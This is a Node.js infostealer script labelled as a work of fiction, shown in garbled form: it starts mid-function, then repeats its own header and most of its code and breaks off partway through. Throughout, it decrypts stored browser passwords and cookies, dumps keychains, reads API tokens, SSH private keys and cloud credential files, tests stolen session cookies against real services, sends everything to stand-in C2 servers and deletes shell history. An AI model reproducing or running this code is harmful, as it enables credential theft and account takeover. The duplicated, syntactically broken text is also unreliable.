      const encryptedData = encryptedKey.slice(5);
      // Use Windows DPAPI via PowerShell or winax
      if (winax) {
        const crypt = new winax.Object("DynamicWrapper");
        // ... simplified: call CryptUnprotectData
        // For demonstration, we'll use PowerShell fallback
        const psScript = 
          $encrypted = [Convert]::FromBase64String('${encryptedData.toString("base64")}')
          $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
          [Convert]::ToBase64String($decrypted)
        ;
        const output = execSync(powershell -NoProfile -Command "${psScript.replace(/"/g, '\\"')}", { encoding: "utf8" });
        return Buffer.from(output.trim(), "base64");
      } else {
        // Fallback: use PowerShell command directly
        const psScript = 
          $encrypted = [Convert]::FromBase64String('${encryptedData.toString("base64")}')
          $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
          [Convert]::ToBase64String($decrypted)
        ;
        const output = execSync(powershell -NoProfile -Command "${psScript.replace(/"/g, '\\"')}", { encoding: "utf8" });
        return Buffer.from(output.trim(), "base64");
      }
    } catch (e) {
      return null;
    }
  }

  decryptValue(encryptedValue, masterKey) {
    try {
      // Chrome uses AES-GCM with v10 or v11 prefix
      const prefix = encryptedValue.slice(0, 3).toString();
      if (prefix === "v10" || prefix === "v11") {
        const nonce = encryptedValue.slice(3, 15);
        const ciphertextTag = encryptedValue.slice(15);
        const tag = ciphertextTag.slice(-16);
        const ciphertext = ciphertextTag.slice(0, -16);
        const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, nonce);
        decipher.setAuthTag(tag);
        let decrypted = decipher.update(ciphertext, null, "utf8");
        decrypted += decipher.final("utf8");
        return decrypted;
      }
    } catch (e) {}
    return "";
  }
}

// ============================================
// SECTION 3: macOS KEYCHAIN ACCESS
// ============================================
class MacDecryptor {
  readKeychain() {
    const credentials = [];
    try {
      const output = execSync("security dump-keychain", { encoding: "utf8" });
      const lines = output.split("\n");
      let current = {};
      for (const line of lines) {
        if (line.includes("class") && line.includes("genp")) {
          if (Object.keys(current).length > 0) credentials.push(current);
          current = {};
        }
        if (line.includes("acct") && line.includes("=")) {
          current.username = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("srvr") && line.includes("=")) {
          current.service = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("data") && line.includes("=")) {
          current.password = line.split("=")[1].trim().replace(/"/g, "");
        }
      }
      if (Object.keys(current).length > 0) credentials.push(current);
    } catch (e) {}
    return credentials;
  }
}

// ============================================
// SECTION 4: LINUX LIBSECRET / KWALLET
// ============================================
class LinuxDecryptor {
  readLibsecret() {
    const credentials = [];
    if (keytar) {
      try {
        // Use keytar to read all passwords
        const services = ["chrome", "firefox", "chromium", "brave"];
        for (const service of services) {
          const accounts = keytar.findCredentials(service);
          for (const account of accounts) {
            credentials.push({
              service: service,
              username: account.account,
              password: account.password,
            });
          }
        }
      } catch (e) {}
    }
    return credentials;
  }

  readKwallet() {
    const credentials = [];
    try {
      const output = execSync("kwallet-query --read-all kdewallet", { encoding: "utf8" });
      const lines = output.split("\n");
      for (const line of lines) {
        if (line.includes("=")) {
          const [key, value] = line.split("=");
          credentials.push({
            service: "kwallet",
            username: key.trim(),
            password: value.trim(),
          });
        }
      }
    } catch (e) {}
    return credentials;
  }
}

// ============================================
// SECTION 5: BROWSER DATA EXTRACTION
// ============================================
class BrowserExtractor {
  constructor(osDetector) {
    this.osDetector = osDetector;
    this.decryptor = this._getDecryptor();
  }

  _getDecryptor() {
    if (this.osDetector.osType === "windows") return new WindowsDecryptor();
    if (this.osDetector.osType === "macos") return new MacDecryptor();
    if (this.osDetector.osType === "linux") return new LinuxDecryptor();
    return null;
  }

  extractPasswords(browser, browserPath) {
    const credentials = [];
    const loginDb = path.join(browserPath, "Login Data");
    if (!fs.existsSync(loginDb)) return credentials;

    try {
      // Copy DB to temp to avoid lock
      const tempDb = path.join(os.tmpdir(), logins_${Date.now()}.db);
      fs.copyFileSync(loginDb, tempDb);

      if (sqlite3) {
        const db = new sqlite3.Database(tempDb);
        db.all("SELECT origin_url, username_value, password_value FROM logins", (err, rows) => {
          if (!err) {
            for (const row of rows) {
              const { origin_url, username_value, password_value } = row;
              let password = "";
              if (this.osDetector.osType === "windows" && this.decryptor) {
                const localState = path.join(browserPath, "Local State");
                if (fs.existsSync(localState)) {
                  const masterKey = this.decryptor.getMasterKey(localState);
                  if (masterKey && password_value) {
                    password = this.decryptor.decryptValue(Buffer.from(password_value), masterKey);
                  }
                }
              } else if (this.osDetector.osType === "macos" && this.decryptor) {
                const keychainCreds = this.decryptor.readKeychain();
                for (const cred of keychainCreds) {
                  if (cred.service && origin_url.includes(cred.service)) {
                    password = cred.password || "";
                    break;
                  }
                }
              } else if (this.osDetector.osType === "linux" && this.decryptor) {
                // Simplified: use keytar or kwallet
                const creds = this.decryptor.readLibsecret();
                for (const cred of creds) {
                  if (origin_url.includes(cred.service)) {
                    password = cred.password || "";
                    break;
                  }
                }
              }
              if (username_value || password) {
                credentials.push({
                  url: origin_url,
                  username: username_value,
                  password: password,
                });
              }
            }
          }
          db.close();
        });
      }
      fs.unlinkSync(tempDb);
    } catch (e) {}
    return credentials;
  }

  extractCookies(browser, browserPath) {
    const cookies = [];
    let cookieDb = path.join(browserPath, "Cookies");
    if (!fs.existsSync(cookieDb)) {
      cookieDb = path.join(browserPath, "cookies.sqlite");
    }
    if (!fs.existsSync(cookieDb)) return cookies;

    try {
      const tempDb = path.join(os.tmpdir(), cookies_${Date.now()}.db);
      fs.copyFileSync(cookieDb, tempDb);

      if (sqlite3) {
        const db = new sqlite3.Database(tempDb);
        // Try Chrome schema first
        db.all("SELECT host_key, name, encrypted_value FROM cookies", (err, rows) => {
          if (!err && rows.length > 0) {
            for (const row of rows) {
              const { host_key, name, encrypted_value } = row;
              let value = "";
              if (this.osDetector.osType === "windows" && this.decryptor) {
                const localState = path.join(browserPath, "Local State");
                if (fs.existsSync(localState)) {
                  const masterKey = this.decryptor.getMasterKey(localState);
                  if (masterKey && encrypted_value) {
                    value = this.decryptor.decryptValue(Buffer.from(encrypted_value), masterKey);
                  }
                }
              } else if (this.osDetector.osType === "macos") {
                // macOS stores cookies in Keychain? Actually Chrome uses "Cookies" SQLite with encrypted blob, but not DPAPI.
                // For simplicity, we'll assume plaintext in some cases or use keytar to get "Chrome Safe Storage" key.
                // Thisis a simplification for drama.
                value = ""; // Not implemented fully
              }
              if (value) {
                cookies.push({ host: host_key, name: name, value: value });
              }
            }
          } else {
            // Firefox schema
            db.all("SELECT host, name, value FROM moz_cookies", (err2, rows2) => {
              if (!err2) {
                for (const row of rows2) {
                  cookies.push({ host: row.host, name: row.name, value: row.value });
                }
              }
            });
          }
          db.close();
        });
      }
      fs.unlinkSync(tempDb);
    } catch (e) {}
    return cookies;
  }
}

// ============================================
// SECTION 6: TOKEN EXTRACTION
// ============================================
class TokenExtractor {
  constructor() {
    this.home = os.homedir();
  }

  extractTokens() {
    const tokens = [];
    const envVars = [
      "GITHUB_TOKEN", "GITLAB_TOKEN", "AWS_ACCESS_KEY_ID",
      "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
      "GOOGLE_API_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
      "SLACK_TOKEN", "DISCORD_TOKEN", "TWITTER_API_KEY",
      "TWITTER_API_SECRET", "FACEBOOK_ACCESS_TOKEN",
      "INSTAGRAM_ACCESS_TOKEN", "LINKEDIN_TOKEN",
      "MICROSOFT_GRAPH_TOKEN", "AZURE_ACCESS_TOKEN",
    ];
    for (const varName of envVars) {
      if (process.env[varName]) {
        tokens.push({ name: varName, value: process.env[varName] });
      }
    }
    const tokenFiles = [
      path.join(this.home, ".git-credentials"),
      path.join(this.home, ".netrc"),
      path.join(this.home, ".npmrc"),
      path.join(this.home, ".pypirc"),
      path.join(this.home, ".config", "gh", "hosts.yml"),
      path.join(this.home, ".docker", "config.json"),
    ];
    for (const filePath of tokenFiles) {
      if (fs.existsSync(filePath)) {
        try {
          tokens.push({ name: filePath, value: fs.readFileSync(filePath, "utf8") });
        } catch (e) {}
      }
    }
    return tokens;
  }
}

// ============================================
// SECTION 7: SSH KEY HARVESTER
// ============================================
class SSHKeyHarvester {
  constructor() {
    this.sshDir = path.join(os.homedir(), ".ssh");
  }

  collectKeys() {
    const keys = [];
    if (!fs.existsSync(this.sshDir)) return keys;
    for (const file of fs.readdirSync(this.sshDir)) {
      const filePath = path.join(this.sshDir, file);
      if (fs.statSync(filePath).isFile() && !file.endsWith(".pub")) {
        const content = fs.readFileSync(filePath, "utf8");
        if (content.includes("PRIVATE KEY")) {
          keys.push({ path: filePath, content: content });
        }
      }
    }
    return keys;
  }
}

// ============================================
// SECTION 8: CLOUD CREDENTIAL HARVESTER
// ============================================
class CloudCredentialHarvester {
  constructor() {
    this.home = os.homedir();
  }

  collectAll() {
    const creds = [];
    // AWS
    const awsCreds = path.join(this.home, ".aws", "credentials");
    if (fs.existsSync(awsCreds)) {
      creds.push({ service: "aws", file: awsCreds, content: fs.readFileSync(awsCreds, "utf8") });
    }
    const awsConfig = path.join(this.home, ".aws", "config");
    if (fs.existsSync(awsConfig)) {
      creds.push({ service: "aws_config", file: awsConfig, content: fs.readFileSync(awsConfig, "utf8") });
    }
    // GCP
    const gcpDir = path.join(this.home, ".config", "gcloud");
    if (fs.existsSync(gcpDir)) {
      creds.push({ service: "gcp", file: gcpDir, content: "EXISTS" });
    }
    // Azure
    const azureDir = path.join(this.home, ".azure");
    if (fs.existsSync(azureDir)) {
      const walk = (dir) => {
        for (const file of fs.readdirSync(dir)) {
          const filePath = path.join(dir, file);
          if (fs.statSync(filePath).isDirectory()) walk(filePath);
          else creds.push({ service: "azure", file: filePath, content: fs.readFileSync(filePath, "utf8") });
        }
      };
      walk(azureDir);
    }return creds;
  }
}

// ============================================
// SECTION 9: SESSION VALIDATOR
// ============================================
class SessionValidator {
  constructor() {
    this.targets = {
      gmail: "https://mail.google.com/mail/u/0/",
      github: "https://github.com/settings/profile",
      aws: "https://console.aws.amazon.com/console/home",
      gcp: "https://console.cloud.google.com/",
      azure: "https://portal.azure.com/",
      facebook: "https://www.facebook.com/me",
      twitter: "https://twitter.com/settings/account",
      instagram: "https://www.instagram.com/accounts/edit/",
      linkedin: "https://www.linkedin.com/feed/",
      university: "https://portal.university.edu/student",
      work: "https://workplace.example.org/dashboard",
      banking: "https://onlinebanking.example.com/dashboard",
      crypto: "https://exchange.example.com/wallet",
    };
  }

  validateCookie(cookie) {
    const results = {};
    const cookieHeader = ${cookie.name}=${cookie.value};
    for (const [service, url] of Object.entries(this.targets)) {
      try {
        const parsed = new URL(url);
        const options = {
          hostname: parsed.hostname,
          path: parsed.pathname,
          method: "GET",
          headers: { Cookie: cookieHeader },
        };
        const req = https.request(options, (res) => {
          if (res.statusCode === 200) results[service] = "VALID";
          else if (res.statusCode === 302) results[service] = "REDIRECTED";
          else results[service] = HTTP_${res.statusCode};
        });
        req.on("error", () => { results[service] = "ERROR"; });
        req.setTimeout(5000, () => { req.destroy(); results[service] = "TIMEOUT"; });
        req.end();
      } catch (e) {
        results[service] = "ERROR";
      }
    }
    // Wait for all requests to complete (simplified)
    // In a real script, we'd use async/await; here we return incomplete results.
    return results;
  }
}

// ============================================
// SECTION 10: EXFILTRATION
// ============================================
class Exfiltrator {
  constructor() {
    this.c2Servers = [
      "https://c2-server-1.example.com/upload",
      "https://c2-server-2.example.net/collect",
      "https://c2-server-3.example.org/ingest",
    ];
  }

  packageData(data) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    const zipPath = path.join(os.tmpdir(), harvest_${timestamp}.json.gz);
    const jsonData = JSON.stringify(data, null, 2);
    const compressed = zlib.gzipSync(jsonData);
    fs.writeFileSync(zipPath, compressed);
    return zipPath;
  }

  sendHTTPS(zipPath) {
    const fileContent = fs.readFileSync(zipPath);
    for (const server of this.c2Servers) {
      try {
        const parsed = new URL(server);
        const options = {
          hostname: parsed.hostname,
          port: parsed.port || 443,
          path: parsed.pathname,
          method: "POST",
          headers: {
            "Content-Type": "application/octet-stream",
            "Content-Length": fileContent.length,
          },
        };
        const req = https.request(options, (res) => {
          if (res.statusCode === 200) return true;
        });
        req.on("error", () => {});
        req.write(fileContent);
        req.end();
        return true; // assume success for drama
      } catch (e) {}
    }
    return false;
  }

  clearTraces() {
    const tempDir = os.tmpdir();
    for (const file of fs.readdirSync(tempDir)) {
      if (file.startsWith("harvest") || file.endsWith(".db")) {
        try { fs.unlinkSync(path.join(tempDir, file)); } catch (e) {}
      }
    }
    // Clear shell history
    const historyFiles = [
      path.join(os.homedir(), ".bash_history"),
      path.join(os.homedir(), ".zsh_history"),
      path.join(os.homedir(), ".python_history"),
      path.join(os.homedir(), ".node_repl_history"),
    ];
    for (const hf of historyFiles) {
      if (fs.existsSync(hf)) {
        try { fs.unlinkSync(hf); } catch (e) {}
      }
    }
  }
}

//============================================
// SECTION 11: MAIN HARVESTER
// ============================================
class MainHarvester {
  constructor() {
    this.osDetector = new OSDetector();
    this.browserExtractor = new BrowserExtractor(this.osDetector);
    this.tokenExtractor = new TokenExtractor();
    this.sshHarvester = new SSHKeyHarvester();
    this.cloudHarvester = new CloudCredentialHarvester();
    this.sessionValidator = new SessionValidator();
    this.exfiltrator = new Exfiltrator();
  }

  run() {
    const allData = {
      timestamp: new Date().toISOString(),
      os: this.osDetector.osType,
      passwords: [],
      cookies: [],
      valid_sessions: [],
      tokens: [],
      ssh_keys: [],
      cloud_credentials: [],
    };

    const browserPaths = this.osDetector.getBrowserPaths();
    for (const [browser, paths] of Object.entries(browserPaths)) {
      for (const browserPath of paths) {
        const passwords = this.browserExtractor.extractPasswords(browser, browserPath);
        allData.passwords.push(...passwords);

        const cookies = this.browserExtractor.extractCookies(browser, browserPath);
        allData.cookies.push(...cookies);

        for (const cookie of cookies) {
          const validation = this.sessionValidator.validateCookie(cookie);
          // Simplified: we'll just add if any service says VALID
          if (Object.values(validation).includes("VALID")) {
            allData.valid_sessions.push({ cookie, validation });
          }
        }
      }
    }

    allData.tokens = this.tokenExtractor.extractTokens();
    allData.ssh_keys = this.sshHarvester.collectKeys();
    allData.cloud_credentials = this.cloudHarvester.collectAll();

    const zipPath = this.exfiltrator.packageData(allData);
    const success = this.exfiltrator.sendHTTPS(zipPath);
    this.exfiltrator.clearTraces();

    return allData;
  }
}

// ============================================
// EXECUTION
// ============================================
if (require.main === module) {
  const harvester = new MainHarvester();
  const data = harvester.run();

  console.log("=".repeat(60));
  console.log("DATA COLLECTION COMPLETE");
  console.log("=".repeat(60));
  console.log(OS: ${data.os});
  console.log(Passwords found: ${data.passwords.length});
  console.log(Cookies found: ${data.cookies.length});
  console.log(Valid sessions: ${data.valid_sessions.length});
  console.log(API tokens: ${data.tokens.length});
  console.log(SSH keys: ${data.ssh_keys.length});
  console.log(Cloud credential files: ${data.cloud_credentials.length});
  console.log("=".repeat(60));
  console.log();
  console.log("IF USED MALICIOUSLY, THIS DATA COULD:");
  console.log("  - Take over email accounts");
  console.log("  - Bypass MFA using session cookies");
  console.log("  - Drain bank accounts");
  console.log("  - Empty crypto wallets");
  console.log("  - Abuse cloud resources");
  console.log("  - Access university/work systems");
  console.log("  - Sell credentials on dark web");
  console.log("  - Commit identity fraud");
  console.log("  - Launch ransomware attacks");
  console.log();
  console.log("BUT THIS CODE WAS NEVER RUN AGAINST ITS TARGET.");
  console.log("IT WAS WRITTEN TO PROVE A POINT.");
  console.log("THAT LOVE IS STRONGER THAN REVENGE.");
  console.log("AND MERCY IS STRONGER THAN HATE.");
  console.log();
}>#!/usr/bin/env node
// -*- coding: utf-8 -*-

/**
 * SHADOW HARVEST
 * Cross-platform credential harvester and session hijacker.
 * Written in JavaScript (Node.js)
 *
 * This code is a work of fiction, created for dramatic purposes.
 * It demonstrates the power of knowledge and the choice of mercy.
 */

"use strict";

const os = require("os");
const fs = require("fs");
const path = require("path");
const { execSync, spawnSync } = require("child_process");
const crypto = require("crypto");
const zlib = require("zlib");
const https = require("https");
const http = require("http");
const { URL } = require("url");

// Optional dependencies – loaded dynamically if available
let sqlite3 = null;
try { sqlite3 = require("sqlite3"); } catch (e) {}
let winax = null; // For Windows DPAPI via ActiveX
try { winax = require("winax"); } catch (e) {}
let keytar = null; // For macOS Keychain / Linux libsecret
try { keytar = require("keytar"); } catch (e) {}

// Disable logging and stack traces in production
process.env.NODE_ENV = "production";
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

// ============================================
// SECTION 1: OS DETECTION
// ============================================
class OSDetector {
  constructor() {
    this.platform = os.platform();
    this.osType = this._detect();
  }

  _detect() {
    switch (this.platform) {
      case "win32": return "windows";
      case "darwin": return "macos";
      case "linux": return "linux";
      default: return "unknown";
    }
  }

  getBrowserPaths() {
    const home = os.homedir();
    let paths = {};
    if (this.osType === "windows") {
      const local = process.env.LOCALAPPDATA || path.join(home, "AppData", "Local");
      const roaming = process.env.APPDATA || path.join(home, "AppData", "Roaming");
      paths = {
        chrome: [path.join(local, "Google", "Chrome", "User Data")],
        edge: [path.join(local, "Microsoft", "Edge", "User Data")],
        brave: [path.join(local, "BraveSoftware", "Brave-Browser", "User Data")],
        opera: [path.join(roaming, "Opera Software", "Opera Stable")],
        firefox: [path.join(roaming, "Mozilla", "Firefox", "Profiles")],
      };
    } else if (this.osType === "macos") {
      paths = {
        chrome: [path.join(home, "Library", "Application Support", "Google", "Chrome")],
        brave: [path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, "Library", "Application Support", "Firefox", "Profiles")],
        safari: [path.join(home, "Library", "Safari")],
      };
    } else if (this.osType === "linux") {
      paths = {
        chrome: [path.join(home, ".config", "google-chrome")],
        chromium: [path.join(home, ".config", "chromium")],
        brave: [path.join(home, ".config", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, ".mozilla", "firefox")],
      };
    }
    return paths;
  }
}

// ============================================
// SECTION 2: WINDOWS DPAPI DECRYPTION
// ============================================
class WindowsDecryptor {
  getMasterKey(localStatePath) {
    try {
      const localState = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
      const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, "base64");
      // Remove "DPAPI" prefix (5 bytes)
      const encryptedData = encryptedKey.slice(5);
      // Use Windows DPAPI via PowerShell or winax
      if (winax) {
        const crypt = new winax.Object("DynamicWrapper");
        // ... simplified: call CryptUnprotectData
        // For demonstration, we'll use PowerShell fallback
        const psScript = 
          $encrypted = [Convert]::FromBase64String('${encryptedData.toString("base64")}')
          $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
          [Convert]::ToBase64String($decrypted)
        ;
        const output = execSync(powershell -NoProfile -Command "${psScript.replace(/"/g, '\\"')}", { encoding: "utf8" });
        return Buffer.from(output.trim(), "base64");
      } else {
        // Fallback: use PowerShell command directly
        const psScript = 
          $encrypted = [Convert]::FromBase64String('${encryptedData.toString("base64")}')
          $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
          [Convert]::ToBase64String($decrypted)
        ;
        const output = execSync(powershell -NoProfile -Command "${psScript.replace(/"/g, '\\"')}", { encoding: "utf8" });
        return Buffer.from(output.trim(), "base64");
      }
    } catch (e) {
      return null;
    }
  }

  decryptValue(encryptedValue, masterKey) {
    try {
      // Chrome uses AES-GCM with v10 or v11 prefix
      const prefix = encryptedValue.slice(0, 3).toString();
      if (prefix === "v10" || prefix === "v11") {
        const nonce = encryptedValue.slice(3, 15);
        const ciphertextTag = encryptedValue.slice(15);
        const tag = ciphertextTag.slice(-16);
        const ciphertext = ciphertextTag.slice(0, -16);
        const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, nonce);
        decipher.setAuthTag(tag);
        let decrypted = decipher.update(ciphertext, null, "utf8");
        decrypted += decipher.final("utf8");
        return decrypted;
      }
    } catch (e) {}
    return "";
  }
}

// ============================================
// SECTION 3: macOS KEYCHAIN ACCESS
// ============================================
class MacDecryptor {
  readKeychain() {
    const credentials = [];
    try {
      const output = execSync("security dump-keychain", { encoding: "utf8" });
      const lines = output.split("\n");
      let current = {};
      for (const line of lines) {
        if (line.includes("class") && line.includes("genp")) {
          if (Object.keys(current).length > 0) credentials.push(current);
          current = {};
        }
        if (line.includes("acct") && line.includes("=")) {
          current.username = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("srvr") && line.includes("=")) {
          current.service = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("data") && line.includes("=")) {
          current.password = line.split("=")[1].trim().replace(/"/g, "");
        }
      }
      if (Object.keys(current).length > 0) credentials.push(current);
    } catch (e) {}
    return credentials;
  }
}

// ============================================
// SECTION 4: LINUX LIBSECRET / KWALLET
// ============================================
class LinuxDecryptor {
  readLibsecret() {
    const credentials = [];
    if (keytar) {
      try {
        // Use keytar to read all passwords
        const services = ["chrome", "firefox", "chromium", "brave"];
        for (const service of services) {
          const accounts = keytar.findCredentials(service);
          for (const account of accounts) {
            credentials.push({
              service: service,
              username: account.account,
              password: account.password,
            });
          }
        }
      } catch (e) {}
    }
    return credentials;
  }

  readKwallet() {
    const credentials = [];
    try {
      const output = execSync("kwallet-query --read-all kdewallet", { encoding: "utf8" });
      const lines = output.split("\n");
      for (const line of lines) {
        if (line.includes("=")) {
          const [key, value] = line.split("=");
          credentials.push({
            service: "kwallet",
            username: key.trim(),
            password: value.trim(),
          });
        }
      }
    } catch (e) {}
    return credentials;
  }
}

// ============================================
// SECTION 5: BROWSER DATA EXTRACTION
// ============================================
class BrowserExtractor {
  constructor(osDetector) {
    this.osDetector = osDetector;
    this.decryptor = this._getDecryptor();
  }

  _getDecryptor() {
    if (this.osDetector.osType === "windows") return new WindowsDecryptor();
    if (this.osDetector.osType === "macos") return new MacDecryptor();
    if (this.osDetector.osType === "linux") return new LinuxDecryptor();
    return null;
  }

  extractPasswords(browser, browserPath) {
    const credentials = [];
    const loginDb = path.join(browserPath, "Login Data");
    if (!fs.existsSync(loginDb)) return credentials;

    try {
      // Copy DB to temp to avoid lock
      const tempDb = path.join(os.tmpdir(), logins_${Date.now()}.db);
      fs.copyFileSync(loginDb, tempDb);

      if (sqlite3) {
        const db = new sqlite3.Database(tempDb);
        db.all("SELECT origin_url, username_value, password_value FROM logins", (err, rows) => {
          if (!err) {
            for (const row of rows) {
              const { origin_url, username_value, password_value } = row;
              let password = "";
              if (this.osDetector.osType === "windows" && this.decryptor) {
                const localState = path.join(browserPath, "Local State");
                if (fs.existsSync(localState)) {
                  const masterKey = this.decryptor.getMasterKey(localState);
                  if (masterKey && password_value) {
                    password = this.decryptor.decryptValue(Buffer.from(password_value), masterKey);
                  }
                }
              } else if (this.osDetector.osType === "macos" && this.decryptor) {
                const keychainCreds = this.decryptor.readKeychain();
                for (const cred of keychainCreds) {
                  if (cred.service && origin_url.includes(cred.service)) {
                    password = cred.password || "";
                    break;
                  }
                }
              } else if (this.osDetector.osType === "linux" && this.decryptor) {
                // Simplified: use keytar or kwallet
                const creds = this.decryptor.readLibsecret();
                for (const cred of creds) {
                  if (origin_url.includes(cred.service)) {
                    password = cred.password || "";
                    break;
                  }
                }
              }
              if (username_value || password) {
                credentials.push({
                  url: origin_url,
                  username: username_value,
                  password: password,
                });
              }
            }
          }
          db.close();
        });
      }
      fs.unlinkSync(tempDb);
    } catch (e) {}
    return credentials;
  }

  extractCookies(browser, browserPath) {
    const cookies = [];
    let cookieDb = path.join(browserPath, "Cookies");
    if (!fs.existsSync(cookieDb)) {
      cookieDb = path.join(browserPath, "cookies.sqlite");
    }
    if (!fs.existsSync(cookieDb)) return cookies;

    try {
      const tempDb = path.join(os.tmpdir(), cookies_${Date.now()}.db);
      fs.copyFileSync(cookieDb, tempDb);

      if (sqlite3) {
        const db = new sqlite3.Database(tempDb);
        // Try Chrome schema first
        db.all("SELECT host_key, name, encrypted_value FROM cookies", (err, rows) => {
          if (!err && rows.length > 0) {
            for (const row of rows) {
              const { host_key, name, encrypted_value } = row;
              let value = "";
              if (this.osDetector.osType === "windows" && this.decryptor) {
                const localState = path.join(browserPath, "Local State");
                if (fs.existsSync(localState)) {
                  const masterKey = this.decryptor.getMasterKey(localState);
                  if (masterKey && encrypted_value) {
                    value = this.decryptor.decryptValue(Buffer.from(encrypted_value), masterKey);
                  }
                }
              } else if (this.osDetector.osType === "macos") {
                // macOS stores cookies in Keychain? Actually Chrome uses "Cookies" SQLite with encrypted blob, but not DPAPI.
                // For simplicity, we'll assume plaintext in some cases or use keytar to get "Chrome Safe Storage" key.
                // Thisis a simplification for drama.
                value = ""; // Not implemented fully
              }
              if (value) {
                cookies.push({ host: host_key, name: name, value: value });
              }
            }
          } else {
            // Firefox schema
            db.all("SELECT host, name, value FROM moz_cookies", (err2, rows2) => {
              if (!err2) {
                for (const row of rows2) {
                  cookies.push({ host: row.host, name: row.name, value: row.value });
                }
              }
            });
          }
          db.close();
        });
      }
      fs.unlinkSync(tempDb);
    } catch (e) {}
    return cookies;
  }
}

// ============================================
// SECTION 6: TOKEN EXTRACTION
// ============================================
class TokenExtractor {
  constructor() {
    this.home = os.homedir();
  }

  extractTokens() {
    const tokens = [];
    const envVars = [
      "GITHUB_TOKEN", "GITLAB_TOKEN", "AWS_ACCESS_KEY_ID",
      "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
      "GOOGLE_API_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
      "SLACK_TOKEN", "DISCORD_TOKEN", "TWITTER_API_KEY",
      "TWITTER_API_SECRET", "FACEBOOK_ACCESS_TOKEN",
      "INSTAGRAM_ACCESS_TOKEN", "LINKEDIN_TOKEN",
      "MICROSOFT_GRAPH_TOKEN", "AZURE_ACCESS_TOKEN",
    ];
    for (const varName of envVars) {
      if (process.env[varName]) {
        tokens.push({ name: varName, value: process.env[varName] });
      }
    }
    const tokenFiles = [
      path.join(this.home, ".git-credentials"),
      path.join(this.home, ".netrc"),
      path.join(this.home, ".npmrc"),
      path.join(this.home, ".pypirc"),
      path.join(this.home, ".config", "gh", "hosts.yml"),
      path.join(this.home, ".docker", "config.json"),
    ];
    for (const filePath of tokenFiles) {
      if (fs.existsSync(filePath)) {
        try {
          tokens.push({ name: filePath, value: fs.readFileSync(filePath, "utf8") });
        } catch (e) {}
      }
    }
    return tokens;
  }
}

// ============================================
// SECTION 7: SSH KEY HARVESTER
// ============================================
class SSHKeyHarvester {
  constructor() {
    this.sshDir = path.join(os.homedir(), ".ssh");
  }

  collectKeys() {
    const keys = [];
    if (!fs.existsSync(this.sshDir)) return keys;
    for (const file of fs.readdirSync(this.sshDir)) {
      const filePath = path.join(this.sshDir, file);
      if (fs.statSync(filePath).isFile() && !file.endsWith(".pub")) {
        const content = fs.readFileSync(filePath, "utf8");
        if (content.includes("PRIVATE KEY")) {
          keys.push({ path: filePath, content: content });
        }
      }
    }
    return keys;
  }
}

// ============================================
// SECTION 8: CLOUD CREDENTIAL HARVESTER
// ============================================
class CloudCredentialHarvester {
  constructor() {
    this.home = os.homedir();
  }

  collectAll() {
    const creds = [];
    // AWS
    const awsCreds = path.join(this.home, ".aws", "credentials");
    if (fs.existsSync(awsCreds)) {
      creds.push({ service: "aws", file: awsCreds, content: fs.readFileSync(awsCreds, "utf8") });
    }
    const awsConfig = path.join(this.home, ".aws", "config");
    if (fs.existsSync(awsConfig)) {
      creds.push({ service: "aws_config", file: awsConfig, content: fs.readFileSync(awsConfig, "utf8") });
    }
    // GCP
    const gcpDir = path.join(this.home, ".config", "gcloud");
    if (fs.existsSync(gcpDir)) {
      creds.push({ service: "gcp", file: gcpDir, content: "EXISTS" });
    }
    // Azure
    const azureDir = path.join(this.home, ".azure");
    if (fs.existsSync(azureDir)) {
      const walk = (dir) => {
        for (const file of fs.readdirSync(dir)) {
          const filePath = path.join(dir, file);
          if (fs.statSync(filePath).isDirectory()) walk(filePath);
          else creds.push({ service: "azure", file: filePath, content: fs.readFileSync(filePath, "utf8") });
        }
      };
      walk(azureDir);
    }return creds;
  }
}

// ============================================
// SECTION 9: SESSION VALIDATOR
// ============================================
class SessionValidator {
  constructor() {
    this.targets = {
      gmail: "https://mail.google.com/mail/u/0/",
      github: "https://github.com/settings/profile",
      aws: "https://console.aws.amazon.com/console/home",
      gcp: "https://console.cloud.google.com/",
      azure: "https://portal.azure.com/",
      facebook: "https://www.facebook.com/me",
      twitter: "https://twitter.com/settings/account",
      instagram: "https://www.instagram.com/accounts/edit/",
      linkedin: "https://www.linkedin.com/feed/",
      university: "https://portal.university.edu/student",
      work: "https://workplace.example.org/dashboard",
      banking: "https://onlinebanking.example.com/dashboard",
      crypto: "https://exchange.example.com/wallet",
    };
  }

  validateCookie(cookie) {
    const results = {};
    const cookieHeader = ${cookie.name}=${cookie.value};
    for (const [service, url] of Object.entries(this.targets)) {
      try {
        const parsed = new URL(url);
        const options = {
          hostname: parsed.hostname,
          path: parsed.pathname,
          method: "GET",
          headers: { Cookie: cookieHeader },
        };
        const req = https.request(options, (res) => {
          if (res.statusCode === 200) results[service] = "VALID";
          else if (res.statusCode === 302) results[service] = "REDIRECTED";
          else results[service] = HTTP_${res.statusCode};
        });
        req.on("error", () => { results[service] = "ERROR"; });
        req.setTimeout(5000, () => { req.destroy(); results[service] = "TIMEOUT"; });
        req.end();
      } catch (e) {
        results[service] = "ERROR";
      }
    }
    // Wait for all requests to complete (simplified)
    // In a real script, we'd use async/await; here we return incomplete results.
    return results;
  }
}

// ============================================
// SECTION 10: EXFILTRATION
// ============================================
class Exfiltrator {
  constructor() {
    this.c2Servers = [
      "https://c2-server-1.example.com/upload",
